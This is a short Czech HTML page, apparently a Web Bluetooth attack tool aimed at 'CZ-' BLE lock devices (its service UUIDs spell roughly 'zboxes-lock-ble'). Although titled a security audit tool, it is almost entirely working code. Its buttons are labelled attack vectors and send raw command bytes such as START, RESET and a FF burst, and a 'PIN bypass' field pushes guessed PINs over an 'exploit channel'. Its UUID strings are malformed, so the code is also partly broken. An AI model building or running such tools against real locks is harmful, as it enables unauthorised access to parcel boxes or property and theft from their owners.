<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Audit Tool v2.0</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .panel { border: 1px solid #00ff00; padding: 15px; border-radius: 5px; margin-bottom: 10px; }
        button { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background: #00ff00; color: #000; }
        #log { background: #000; border: 1px solid #444; height: 250px; overflow-y: scroll; padding: 10px; font-size: 12px; color: #aaa; }
        .status { color: #fff; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>SYSTEM AUDIT: CZ-LOKJ 🔱</h1>
    
    <div class="panel">
        <div class="status" id="status">Stav: Odpojeno</div>
        <button onclick="connect()">1. NAVÁZAT SPOJENÍ</button>
    </div>

    <div class="panel">
        <strong>ATTACK VECTORS (HEX):</strong>
        <button onclick="sendHex([0x01])">POVEL: 01 (START)</button>
        <button onclick="sendHex([0x00])">POVEL: 00 (RESET)</button>
        <button onclick="sendHex([0x01, 0x01])">POVEL: 01 01 (DOUBLE)</button>
        <button onclick="sendHex([0xFF, 0xFF, 0xFF, 0xFF])">POVEL: FULL BURST (FF)</button>
    </div>

    <div class="panel">
        <strong>PIN BYPASS (TEXT):</strong>
        <input type="text" id="pinInput" placeholder="Zadej PIN (např. 123456)" style="width: 70%; padding: 5px;">
        <button onclick="sendText()" style="width: 25%;">ODESLAT</button>
    </div>

    <div id="log">--- SYSTEM LOG READY ---<br></div>

    <script>
        let char;
        const S_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c65';
        const C_UUID = '00007a62-6f78-6573-2d6c-6f63-6b2d626c-31';

        async function log(m) {
            const l = document.getElementById('log');
            l.innerHTML += `> ${m}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        async function connect() {
            try {
                log("Hledám CZ zařízení...");
                const device = await navigator.bluetooth.requestDevice({
                    filters: [{ namePrefix: 'CZ-' }],
                    optionalServices: [S_UUID]
                });
                const server = await device.gatt.connect();
                const service = await server.getPrimaryService(S_UUID);
                char = await service.getCharacteristic(C_UUID);
                document.getElementById('status').innerText = "Stav: PŘIPOJENO k " + device.name;
                log("✅ Exploit kanál připraven.");
            } catch (e) { log("❌ CHYBA: " + e); }
        }

        async function sendHex(bytes) {
            if(!char) return log("⚠️ Nejdřív se připoj!");
            try {
                log(`Odesílám HEX: ${bytes.map(b => b.toString(16)).join(' ')}`);
                await char.writeValue(new Uint8Array(bytes));
                log("✅ Paket doručen.");
            } catch (e) { log("❌ Zamítnuto: " + e); }
        }

        async function sendText() {
            if(!char) return log("⚠️ Nejdřív se připoj!");
            const val = document.getElementById('pinInput').value;
            try {
                log(`Zkouším PIN bypass: ${val}`);
                let enc = new TextEncoder();
                await char.writeValue(enc.encode(val));
                log("✅ PIN paket odeslán.");
            } catch (e) { log("❌ Chyba: " + e); }
        }
    </script>
</body>
</html>
